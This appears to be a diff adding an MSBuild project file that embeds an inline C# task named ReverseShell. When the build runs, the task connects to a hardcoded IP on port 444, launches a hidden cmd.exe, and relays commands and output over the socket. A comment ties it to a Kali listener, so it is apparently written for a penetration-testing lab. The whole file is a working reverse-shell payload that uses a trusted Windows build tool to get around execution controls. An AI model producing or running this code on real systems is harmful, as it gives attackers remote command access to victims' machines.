@@ -1,0 +1,72 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="Execute">
+    <ReverseShell />
+  </Target>
+  <UsingTask
+    TaskName="ReverseShell"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+    <Task>
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+        using System;
+        using System.IO;
+        using System.Diagnostics;
+        using System.Net.Sockets;
+        using Microsoft.Build.Framework;
+        using Microsoft.Build.Utilities;
+
+        public class ReverseShell : Task, ITask
+        {
+            public override bool Execute()
+            {
+                // Matches your Kali IP and your 'nc -lvnp 444' command
+                string ip = "192.168.8.132"; 
+                int port = 444;
+
+                try {
+                    using (TcpClient client = new TcpClient(ip, port))
+                    {
+                        using (Stream stream = client.GetStream())
+                        {
+                            using (StreamReader rdr = new StreamReader(stream))
+                            {
+                                StreamWriter wtr = new StreamWriter(stream) { AutoFlush = true };
+                                wtr.WriteLine("--- Shell Connected to MSBuild ---");
+
+                                Process p = new Process();
+                                p.StartInfo.FileName = "cmd.exe";
+                                p.StartInfo.CreateNoWindow = true;
+                                p.StartInfo.UseShellExecute = false;
+                                p.StartInfo.RedirectStandardOutput = true;
+                                p.StartInfo.RedirectStandardInput = true;
+                                p.StartInfo.RedirectStandardError = true;
+
+                                p.OutputDataReceived += (sender, args) => wtr.WriteLine(args.Data);
+                                p.ErrorDataReceived += (sender, args) => wtr.WriteLine(args.Data);
+
+                                p.Start();
+                                p.BeginOutputReadLine();
+                                p.BeginErrorReadLine();
+
+                                while (!p.HasExited)
+                                {
+                                    string input = rdr.ReadLine();
+                                    if (input == null || input == "exit") break;
+                                    p.StandardInput.WriteLine(input);
+                                }
+                            }
+                        }
+                    }
+                }
+                catch (Exception e) {
+                    Console.WriteLine("Error: " + e.Message);
+                }
+                return true;
+            }
+        }
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
